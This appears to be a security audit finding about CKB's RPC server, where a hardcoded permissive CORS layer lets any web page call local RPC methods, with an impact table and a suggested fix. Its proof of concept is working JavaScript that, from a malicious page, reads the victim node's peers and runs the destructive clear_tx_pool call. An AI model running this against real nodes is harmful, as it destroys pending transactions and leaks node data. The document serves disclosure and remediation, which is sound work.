### Title
Unconditional `CorsLayer::permissive()` on RPC HTTP Server Enables Cross-Origin RPC Calls from Any Web Page — (File: rpc/src/server.rs)

---

### Summary

The CKB RPC HTTP server hardcodes `CorsLayer::permissive()` in its Axum router, setting `Access-Control-Allow-Origin: *` on every response. This bypasses the browser's same-origin policy and allows any web page visited by a node operator to make authenticated cross-origin requests to the local RPC endpoint and read the responses. An unprivileged web attacker can call destructive RPC methods (e.g., `clear_tx_pool`, `set_ban`, `remove_transaction`) without any credential or interaction beyond getting the victim to visit a malicious page.

---

### Finding Description

In `rpc/src/server.rs`, the `start_server` function builds the Axum application and unconditionally layers `CorsLayer::permissive()`:

```rust
let app = Router::new()
    .route("/", method_router.clone())
    .route("/{*path}", method_router)
    .route("/ping", get(ping_handler))
    .layer(Extension(Arc::clone(rpc)))
    .layer(CorsLayer::permissive())   // ← hardcoded, no config knob
    ...
``` [1](#0-0) 

`tower-http`'s `CorsLayer::permissive()` emits:

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: *
Access-Control-Allow-Headers: *
```

on every response. This is applied to both the HTTP server and the WebSocket server (both call `start_server`). [2](#0-1) 

The default RPC listen address is `127.0.0.1:8114`. [3](#0-2) 

The RPC config struct has no field for CORS policy; the permissive setting is not configurable. [4](#0-3) 

Without `Access-Control-Allow-Origin: *`, a browser enforces the same-origin policy and blocks cross-origin responses. With it, any origin can read responses. The RPC being bound to `127.0.0.1` does not prevent browser-initiated requests from other origins — browsers can reach `127.0.0.1` from any web page; the CORS header is the only gate that would have blocked the response from being read.

---

### Impact Explanation

An attacker who gets a node operator to visit a malicious web page can call any enabled RPC method and read the response. Enabled by default:

| Method | Impact |
|---|---|
| `clear_tx_pool` | Destroys all pending transactions; financial loss for users whose txs are evicted |
| `set_ban` | Bans legitimate peers; network isolation / eclipse setup |
| `remove_transaction` | Silently drops specific pending transactions |
| `get_peers` / `local_node_info` | Leaks peer topology, node ID, listen addresses |
| `send_transaction` | Submits any pre-constructed transaction the attacker holds |

For a miner with the `Miner` module enabled, the attacker can also call `get_block_template` to harvest mining state and interfere with block assembly timing.

The WebSocket RPC endpoint (if `ws_listen_address` is configured) is equally affected, allowing persistent subscription to `new_tip_header`, `new_transaction`, etc., leaking real-time mempool and chain data. [5](#0-4) 

---

### Likelihood Explanation

- The default configuration binds RPC to `127.0.0.1:8114`, which is reachable from any browser tab.
- The attack requires only that the victim visit a malicious web page while the node is running — a realistic scenario for developers, miners, and exchange operators who run nodes on their workstations.
- No special privileges, leaked credentials, or network access are required; the browser itself is the attack vector.
- The `CorsLayer::permissive()` call is unconditional production code, not a test artifact.

---

### Recommendation

Replace the hardcoded `CorsLayer::permissive()` with a restrictive policy. At minimum, restrict to `null` origin (for `file://` tooling) and `localhost`/`127.0.0.1`. Expose a `cors_allowed_origins` field in `RpcConfig` so operators can extend it for legitimate use cases (e.g., a local web wallet):

```rust
// Instead of CorsLayer::permissive()
CorsLayer::new()
    .allow_origin([
        "http://localhost".parse::<HeaderValue>().unwrap(),
        "http://127.0.0.1".parse::<HeaderValue>().unwrap(),
    ])
    .allow_methods([Method::POST])
    .allow_headers([CONTENT_TYPE])
``` [6](#0-5) 

---

### Proof of Concept

A malicious web page served from any origin (e.g., `https://attacker.com`) can execute the following in the victim's browser while the victim's CKB node is running:

```javascript
// Step 1: Confirm the node is reachable and read its peer list
fetch('http://127.0.0.1:8114/', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ id: 1, jsonrpc: '2.0', method: 'get_peers', params: [] })
})
.then(r => r.json())
.then(data => {
  console.log('Peers:', data.result);

  // Step 2: Clear the tx pool (destroys all pending transactions)
  return fetch('http://127.0.0.1:8114/', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ id: 2, jsonrpc: '2.0', method: 'clear_tx_pool', params: [] })
  });
})
.then(r => r.json())
.then(data => console.log('clear_tx_pool result:', data));
```

Because `Access-Control-Allow-Origin: *` is present on the response, the browser does not block the read. Both calls succeed silently from the victim's perspective. The `clear_tx_pool` call is irreversible — all pending transactions are lost.
